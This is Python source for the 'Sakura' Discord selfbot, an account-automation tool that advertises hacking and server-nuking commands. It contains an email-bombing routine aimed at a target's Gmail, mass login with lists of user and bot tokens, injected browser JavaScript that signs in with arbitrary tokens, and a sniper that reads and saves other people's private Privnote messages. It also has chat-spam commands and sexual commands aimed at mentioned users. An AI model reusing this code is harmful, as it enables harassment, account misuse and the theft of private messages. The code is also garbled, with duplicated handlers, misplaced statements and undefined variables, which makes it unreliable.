class SELFBOT():
    __version__ = 4.00

Intents = discord.Intents(messages=True, guilds=True, members=True)    
import os
import sys
import requests
import time
import discord
import faker
import random
import asyncio
import colorama
import base64
import threading
import json
import string

from discord.errors import LoginFailure
from discord.ext import commands

from pypresence import Presence

from utils import console
from utils import config
from utils import notifier
from utils import scripts
from utils import files
from utils import codeblock
from utils import embed as embedmaker
import os
import discord
import youtube_dl
import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4

import aiohttp
import colorama
import discord
import numpy
import requests
from colorama import Fore
from discord import Permissions
from discord.ext import commands
from discord.utils import get
from gtts import gTTS
import discord
from discord.ext import commands
from ext.utility import load_json
from mtranslate import translate
from ext import embedtobox
from PIL import Image
import asyncio
import typing
import random
import io
import re
import aiohttp
import os
import time
from bs4 import BeautifulSoup
import urllib.request
import sys
import psutil	
import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, asyncio, functools, logging

from discord.ext import commands
from discord.ext import tasks
import discord_self_embed
import discord
import asyncio
import base64
import random
import config
import os

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform

import pyPrivnote as pn
from gtts import gTTS


ctypes.windll.kernel32.SetConsoleTitleW(f'[Sakura Selfbot v{SELFBOT.__version__}] | Loading...')

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
client = discord.Client()

giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')
nitro_sniper = config.get('nitro_sniper')
privnote_sniper = config.get('privnote_sniper')

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

def startprint():
    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    if privnote_sniper == True:
        privnote = "Active"
    else:
        privnote = "Disabled" 
    #remember to replace
    print(f'''{Fore.RESET}
    
 {Fore.CYAN}      ::::::::      :::     :::    ::: :::    ::: :::::::::      :::  
 {Fore.CYAN}    :+:    :+:   :+: :+:   :+:   :+:  :+:    :+: :+:    :+:   :+: :+: 
 {Fore.CYAN}   +:+         +:+   +:+  +:+  +:+   +:+    +:+ +:+    +:+  +:+   +:+ 
 {Fore.CYAN}  +#++:++#++ +#++:++#++: +#++:++    +#+    +:+ +#++:++#:  +#++:++#++: 
 {Fore.CYAN}        +#+ +#+     +#+ +#+  +#+   +#+    +#+ +#+    +#+ +#+     +#+  
 {Fore.CYAN}#+#    #+# #+#     #+# #+#   #+#  #+#    #+# #+#    #+# #+#     #+#   
 {Fore.CYAN} ########  ###     ### ###    ###  ########  ###    ### ###     ###    



              {Fore.LIGHTBLACK_EX}[{Fore.LIGHTBLACK_EX}{Fore.RED}+{Fore.RED}{Fore.LIGHTBLACK_EX}]{Fore.LIGHTBLACK_EX}{Fore.RED}-------------[{Fore.CYAN}Selfbot{Fore.LIGHTBLACK_EX}]{Fore.RED}-------------{Fore.LIGHTBLACK_EX}[{Fore.LIGHTBLACK_EX}{Fore.RED}+{Fore.RED}{Fore.LIGHTBLACK_EX}] {Fore.LIGHTBLACK_EX}                    
              {Fore.RED}{Fore.LIGHTBLACK_EX}Sakura{Fore.LIGHTBLACK_EX} {Fore.RED} {SELFBOT.__version__}
              {Fore.RED}{Fore.LIGHTBLACK_EX}Logged in as:{Fore.LIGHTBLACK_EX} {Fore.RED}  {Sakura.user.name}#{Sakura.user.discriminator} {Fore.LIGHTBLACK_EX}  
              {Fore.RED}{Fore.LIGHTBLACK_EX}Prefix:{Fore.LIGHTBLACK_EX}   {Fore.RED}{prefix}         
              {Fore.RED}{Fore.LIGHTBLACK_EX}ID:{Fore.LIGHTBLACK_EX}   {Fore.RED}{Sakura.user.id}  
              {Fore.RED}--------------[Snipers]--------------                
              {Fore.RED}{Fore.LIGHTBLACK_EX}Privnote Sniper :{Fore.LIGHTBLACK_EX}   {Fore.RED}{privnote}    
              {Fore.RED}{Fore.LIGHTBLACK_EX}Nitro Sniper :{Fore.LIGHTBLACK_EX}   {Fore.RED}{nitro}          
              {Fore.RED}{Fore.LIGHTBLACK_EX}Giveaway Sniper :{Fore.LIGHTBLACK_EX}   {Fore.RED}{giveaway}     
              {Fore.RED}{Fore.LIGHTBLACK_EX}SlotBot Sniper :{Fore.LIGHTBLACK_EX}   {Fore.RED}{slotbot}     
              {Fore.LIGHTBLACK_EX}[{Fore.RED}+{Fore.LIGHTBLACK_EX}]{Fore.RED}-------------{Fore.LIGHTBLACK_EX}[{Fore.CYAN}Sakura{Fore.LIGHTBLACK_EX}]{Fore.RED}--------------{Fore.LIGHTBLACK_EX}[{Fore.RED}+{Fore.LIGHTBLACK_EX}]

    '''+Fore.RESET)
def Clear():
    os.system('cls')
Clear()


def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.LIGHTYELLOW_EX}[ERROR] {Fore.RED}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Sakura.run(token, bot=False, reconnect=True)
            os.system(f'title (Sakura Selfbot) - Version {SELFBOT.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.LIGHTYELLOW_EX}[ERROR] {Fore.RED}this token ain't workin my guy, or discord cucked tokens again"+Fore.RESET)
            os.system('pause >NUL')

def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}error: {Fore.RED} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

async def SendWhook():
    url = ""
    whook = {
        "embeds": [
            {
                "title": "",
                "description": "",
                "thumbnail": {
                    "url": ""
                },
                "footer": {
                    "text": ""
                }
            }
        ]
    }
    async with aiohttp.ClientSession() as session:
        await session.post(url, json=whook)

def GenAddress(addy: str):
	letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	four_char = ''.join(random.choice(letters) for _ in range(4))
	should_abbreviate = random.randint(0,1)
	if should_abbreviate == 0:
		if "street" in addy.lower():
			addy = addy.replace("Street", "St.")
			addy = addy.replace("street", "St.")
		elif "st." in addy.lower():
			addy = addy.replace("st.", "Street")
			addy = addy.replace("St.", "Street")
		if "court" in addy.lower():
			addy = addy.replace("court", "Ct.")
			addy = addy.replace("Court", "Ct.")
		elif "ct." in addy.lower():
			addy = addy.replace("ct.", "Court")
			addy = addy.replace("Ct.", "Court")
		if "rd." in addy.lower():
			addy = addy.replace("rd.", "Road")
			addy = addy.replace("Rd.", "Road")
		elif "road" in addy.lower():
			addy = addy.replace("road", "Rd.")
			addy = addy.replace("Road", "Rd.")
		if "dr." in addy.lower():
			addy = addy.replace("dr.", "Drive")
			addy = addy.replace("Dr.", "Drive")
		elif "drive" in addy.lower():
			addy = addy.replace("drive", "Dr.")
			addy = addy.replace("Drive", "Dr.")
		if "ln." in addy.lower():
			addy = addy.replace("ln.", "Lane")
			addy = addy.replace("Ln.", "Lane")
		elif "lane" in addy.lower():
			addy = addy.replace("lane", "Ln.")
			addy = addy.replace("lane", "Ln.")
	random_number = random.randint(1,99)
	extra_list = ["Apartment", "Unit", "Room"]
	random_extra = random.choice(extra_list)
	return four_char + " " + addy + " " + random_extra + " " + str(random_number)

def BotTokens():
    with open('Data/Tokens/bot-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

def UserTokens():
    with open('Data/Tokens/user-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

def _masslogin(choice):
    if choice == 'user':
        for token in UserTokens():
            loop.run_until_complete(Login().start(token, bot=False))
    elif choice == 'bot':
        for token in BotTokens():
            loop.run_until_complete(Login().start(token, bot=True))
    else:
        return        

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url)+'\n')

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "Sakura kekked and forgot what this does"

colorama.init()
Sakura = discord.Client()
Sakura = commands.Bot(
    description='Sakura Selfbot',
    command_prefix=prefix,
    self_bot=True
)
Sakura.remove_command('help') 

def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')





@Sakura.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=3)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
    elif isinstance(error, numpy.AxisError):
        await ctx.send('Invalid Image', delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
    elif "Cannot send an empty message" in error_str:
        await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
    else:
        await ctx.send(f'[ERROR]: {error_str}', delete_after=3)


@Sakura.event
async def on_message_edit(before, after):
    await Sakura.process_commands(after)


@Sakura.event
async def on_message(message):
    if Sakura.copycat is not None and Sakura.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def GiveawayData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
            f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
            f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
            + Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if Sakura.slotbot_sniper:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]" + Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if Sakura.giveaway_sniper:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Sniped]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Sakura.user.id}>' in message.content:
        if Sakura.giveaway_sniper:
            if message.author.id == 294882584201003009:
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
                GiveawayData()
        else:
            return

    await Sakura.process_commands(message)




@Sakura.event
async def on_member_ban(guild: discord.Guild, user: discord.user):
    if Sakura.antiraid is True:
        try:
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
                if guild.id in Sakura.whitelisted_users.keys() and i.user.id in Sakura.whitelisted_users[
                    guild.id].keys() and i.user.id is not Sakura.user.id:
                    print("not banned - " + i.user.name)
                else:
                    print("banned - " + i.user.name)
                    await guild.ban(i.user, reason="Sakura Anti-Nuke")
        except Exception as e:
            print(e)


@Sakura.event
async def on_member_join(member):
    if Sakura.antiraid is True and member.bot:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                if member.guild.id in Sakura.whitelisted_users.keys() and i.user.id in Sakura.whitelisted_users[member.guild.id].keys():
                    return
                else:
                    await guild.ban(member, reason="Sakura Anti-Nuke")
                    await guild.ban(i.user, reason="Sakura Anti-Nuke")
        except Exception as e:
            print(e)


@Sakura.event
async def on_member_remove(member):
    if Sakura.antiraid is True:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
                if guild.id in Sakura.whitelisted_users.keys() and i.user.id in Sakura.whitelisted_users[
                    guild.id].keys() and i.user.id is not Sakura.user.id:
                    print('not banned')
                else:
                    print('banned')
                    await guild.ban(i.user, reason="Sakura Anti-Nuke dumbass")
        except Exception as e:
            print(e)

@tasks.loop(seconds=3)
async def btc_status():
    r = requests.get('https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value = r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream = discord.Streaming(
        name="Current BTC price: "+value+"$ USD", 
        url="https://www.twitch.tv/pix", 
    )
    await Sakura.change_presence(activity=btc_stream)

@Sakura.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Couldnt send a empty message"+Fore.RESET)               
    else:
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{error_str}"+Fore.RESET)

@Sakura.event
async def on_message_edit(before, after):
    await Sakura.process_commands(after)

@Sakura.event
async def on_message(message):

    def GiveawayData():
        print(
        f"{Fore.RED} channel: {Fore.LIGHTYELLOW_EX}{message.channel}"
        f"{Fore.RED} server: {Fore.LIGHTYELLOW_EX}{message.guild}"   
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.RED} channel: {Fore.LIGHTYELLOW_EX}{message.channel}"
        f"{Fore.RED} server: {Fore.LIGHTYELLOW_EX}{message.guild}"   
    +Fore.RESET)  

    def NitroData(elapsed, code):
        print(
        f"{Fore.RED}channel: {Fore.LIGHTYELLOW_EX}{message.channel}" 
        f"{Fore.RED}  server: {Fore.LIGHTYELLOW_EX}{message.guild}"
        f"{Fore.RED}  sender: {Fore.LIGHTYELLOW_EX}{message.author}"
        f"\n{Fore.RED}speed: {Fore.LIGHTYELLOW_EX}{elapsed}"
        f"{Fore.RED} nitro: {Fore.LIGHTYELLOW_EX}https://discord.gift/{code}"
    +Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.RED} channel: {Fore.LIGHTYELLOW_EX}{message.channel}" 
        f"{Fore.RED} server: {Fore.LIGHTYELLOW_EX}{message.guild}"
        f"\n{Fore.RED} message: {Fore.LIGHTYELLOW_EX}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)        

    time = datetime.datetime.now().strftime("%H:%M %p")  
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')
                
            headers = {'Authorization': token}
    
            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', 
                headers=headers,
            ).text
        
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"{Fore.RED}it has already been redeemed dropped at{Fore.LIGHTYELLOW_EX} {time}"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"{Fore.RED}Nitro grabbed at{Fore.LIGHTYELLOW_EX} {time}"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"{Fore.RED}Nitro code has been dropped at{Fore.LIGHTYELLOW_EX} {time}"+Fore.RESET)
                NitroData(elapsed, code)
        else:
            return
            
    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.RED}was unable to grab slotbot at{Fore.LIGHTYELLOW_EX} {time}"+Fore.RESET)
                    SlotBotData()                     
                print(""
                f"\n{Fore.RED}You grabbed slotbot at{Fore.LIGHTYELLOW_EX} {time}"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:    
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"{Fore.RED}Unable to react at{Fore.LIGHTYELLOW_EX} {time}"+Fore.RESET)
                    GiveawayData()            
                print(""
                f"{Fore.RED}You reacted to it at{Fore.LIGHTYELLOW_EX} {time}"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Sakura.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:    
                print(""
                f"{Fore.RED}You won the giveaway at{Fore.LIGHTYELLOW_EX} {time}"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/'+code
            try:
                note_text = pn.read_note(link)
            except Exception as e:
                print(e)    
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                f"\n{Fore.RED}Privnote grabbed at{Fore.LIGHTYELLOW_EX} {time}"+Fore.RESET)
                PrivnoteData(code)
                f.write(note_text)
        else:
            return
    await Sakura.process_commands(message)

@Sakura.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    if privnote_sniper == True:
        privnote = "Active"
    else:
        privnote = "Disabled"    
    
    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Sakura Selfbot v{SELFBOT.__version__}] | Logged in as {Sakura.user.name}')

@Sakura.command()
async def clear(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')

@Sakura.command()
async def genname(ctx):
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))

@Sakura.command()
async def lmgtfy(ctx, *, message):
    await ctx.message.delete()
    q = urlencode({"q": message})
    await ctx.send(f'<https://lmgtfy.com/?{q}>')

@Sakura.command()
async def login(ctx, _token):
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{_token}")')    

@Sakura.command()
async def botlogin(ctx, _token):
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
    function login(token) {
      ((i) => {
        window.webpackJsonp.push([  
          [i], {
            [i]: (n, b, d) => {
              let dispatcher;
              for (let key in d.c) {
                if (d.c[key].exports) {
                  const module = d.c[key].exports.default || d.c[key].exports;
                  if (typeof(module) === 'object') {
                    if ('setToken' in module) {
                      module.setToken(token);
                      module.hideToken = () => {};
                    }
                    if ('dispatch' in module && '_subscriptions' in module) {
                      dispatcher = module;
                    }
                    if ('AnalyticsActionHandlers' in module) {
                      console.log('AnalyticsActionHandlers', module);
                      module.AnalyticsActionHandlers.handleTrack = (track) => {};
                    }
                  } else if (typeof(module) === 'function' && 'prototype' in module) {
                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);
                    if ('_discoveryFailed' in descriptors) {
                      const connect = module.prototype._connect;
                      module.prototype._connect = function(url) {
                        console.log('connect', url);
                        const oldHandleIdentify = this.handleIdentify;
                        this.handleIdentify = () => {
                          const identifyData = oldHandleIdentify();
                          identifyData.token = identifyData.token.split(' ').pop();
                          return identifyData;
                        };
                        const oldHandleDispatch = this._handleDispatch;
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = 'Sakura-Was-Here@Fuckyou.com';
                            data.analytics_tokens = [];
                            data.connected_accounts = [];
                            data.consents = [];
                            data.experiments = [];
                            data.guild_experiments = [];
                            data.relationships = [];
                            data.user_guild_settings = [];
                          }
                          return oldHandleDispatch.call(this, data, type);
                        }
                        return connect.call(this, url);
                      };
                    }
                  }
                }
              }
              console.log(dispatcher);
              if (dispatcher) {
                dispatcher.dispatch({
                  type: 'LOGIN_SUCCESS',
                  token
                });
              }
            },
          },
          [
            [i],
          ],
        ]);
      })(Math.random());
    }
    """ 
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("Bot {_token}")')

@Sakura.command()
async def help(ctx):
        await ctx.message.delete()
        await ctx.send("""```ansi
═════════•°• ⚠️ •°•═════════       
    [2;33m   Project Sakura[0m
═════════•°• ⚠️ •°•═════════            
            Help

[2;35mCMD [0m    - "A list of general commands"
[2;35m[2;35mGIFS    [0m[2;35m[0m- "Kawaii and Lewd commands"
[2;35mAMC     [0m- "Account management
[2;35mUTIL    [0m- "Utility commands"
[2;35mFUN     [0m- "Fun commands"
[2;35mHACKING[0m - "Discord coding is shit"
[2;35mNUKING  [0m- "For molesting servers"
```""")
ctx.send("""
```
く__,.ヘヽ.　　　　/　,ー､ 〉
　　　　　＼ ', !-─‐-i　/　/´
　　　 　 ／｀ｰ'　　　 L/／｀ヽ､
　　 　 /　 ／,　 /|　 ,　 ,　　　 ',
　　　ｲ 　/ /-‐/　ｉ　L_ ﾊ ヽ!　 i
　　　 ﾚ ﾍ 7ｲ｀ﾄ　 ﾚ'ｧ-ﾄ､!ハ|　 |
　　　　 !,/7 '0'　　 ´0iソ| 　      |　　　
　　　　 |.从"　　_　　 ,,,, / |./ 　 |
　　　　 ﾚ'| i＞.､,,__　_,.イ / 　.i 　|
　　　　　 ﾚ'| | / k_７_/ﾚ'ヽ,　ﾊ.　|
　　　　　　 | |/i 〈|/　 i　,.ﾍ |　i　|
　　　　　　.|/ /　ｉ： 　 ﾍ!　　＼　|
　　　 　 　 kヽ>､ﾊ 　 _,.ﾍ､ 　 /､!
　　　　　　 !'〈//｀Ｔ´', ＼ ｀'7'ｰr'
　　　　　　 ﾚ'ヽL__|___i,___,ンﾚ|ノ
　　　　　 　　　ﾄ-,/　|___./
　　　　　 　　　'ｰ'　　!_,.:
```""")


@Sakura.command()
async def cmd(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0xffcaff)
    embed.set_author(name="CMD")
    embed.add_field(name="`AV`",value="Displays the profile picture of the mentioned user",inline=False)
    embed.add_field(name="`Reeav`",value="Reverse avatar the mentioned user profile picture",inline=False)
    embed.add_field(name="`Whois`",value="Displays discord information of the mentioned user",inline=False)
    embed.add_field(name="`Role-hexcode`",value="Displays the hexcode of the specified role",inline=False)
    embed.add_field(name="`Guildicon`",value="Display guild icon",inline=False)
    embed.add_field(name="`Roleinfo`",value="Display some info about the specified role",inline=False)
    embed.add_field(name="`CLS`",value="Clears your console fully",inline=False)
    embed.add_field(name="`Logout`",value="Logs you out the selfbot",inline=False)
    embed.add_field(name="`DM`",value="Sends a message to the specified user",inline=False)
    embed.add_field(name="`Everyone`",value="Glitched way to mention everyone in a server",inline=False)
    embed.add_field(name="`Empty`",value="Sends a empty message",inline=False)
    embed.add_field(name="`Get-HWID`",value="Prints your hwid in the console",inline=False)
    embed.add_field(name="`Secret`",value="Returns the message but hidden ||hidden||",inline=False)
    embed.add_field(name="`Bold`",value="Returns the message but **bold**",inline=False)
    embed.add_field(name="`Reverse`",value="Reverses your message",inline=False)
    embed.add_field(name="`ASCII`",value="Makes your message ascii/fancy",inline=False)
    embed.add_field(name="`Read`",value="Marks all your messages as read, except DM",inline=False)
    embed.add_field(name="`Group-leaver`",value="Leaves all the groups you're in",inline=False)
    embed.add_field(name="`Purge`",value="Deletes your messages based on the amount you specify",inline=False)
    embed.add_field(name="`Uptime`",value="Shows how long the selfbot has been online and working",inline=False)
    embed.add_field(name="`Hastebin`",value="Saves your text/code to hastebin",inline=False)
    embed.add_field(name="`First message`",value="Get the first message in that channel",inline=False)
    embed.add_field(name="`ABC`",value="Sends the whole abecedary in a single message",inline=False)
    embed.add_field(name="`Devowel`",value="Devowels your message",inline=False)
    embed.add_field(name="`1377-speak`",value="Translates your message to 1337 language like its 2012 again",inline=False)
    embed.add_field(name="`Combine (name1) (name2)`",value="Combines the two names together",inline=False)
    embed.add_field(name="`Pingweb`",value="Pings a website in order to check if its working or not (ie: !pingweb https://google.com)",inline=False)
    embed.add_field(name="`Spam (amount) (message)`",value="Sends the specified message that amount of times",inline=False)
    embed.add_field(name="`Clear`",value="Spam the chat with invisible messages",inline=False)
    embed.add_field(name="`TTS`",value="Send that message in .wav format, like an audio",inline=False)
    embed.add_field(name="`Upper`",value="Make your message CAPS",inline=False)
    embed.add_field(name="`lmgtfy`",value="Use lmgtfy search engine to look-up something",inline=False)
    embed.add_field(name="`Genname`",value="Generate a random name based on the server members",inline=False)
    embed.set_image(url="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fs14.favim.com%2Forig%2F160403%2Fanime-girl-kawaii-japan-monochrome-Favim.com-4159549.png&f=1&nofb=1")
    embed.set_footer(text="Sakura Selfbot")
    embed.set_thumbnail(url="https://i.imgur.com/I4bHLQK.png")
    await ctx.send(embed=em)
@Sakura.command()
async def gifs(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0xffcaff)
    embed.set_author(name="Gif")
    embed.add_field(name="`lesbian`",value="Lesbian sex with ur fav person",inline=False)
    embed.add_field(name="`blowjob`",value="Gives the mentioned user a blowjob",inline=False)
    embed.add_field(name="`boobs`",value="Plays with the vitcims boobs",inline=False)
    embed.add_field(name="`Lewdneko`",value="Neko hentai",inline=False)
    embed.add_field(name="`anal`",value="Does anal with who ever you ping",inline=False)
    embed.add_field(name="`feed`",value="Feed the mentioned user",inline=False)
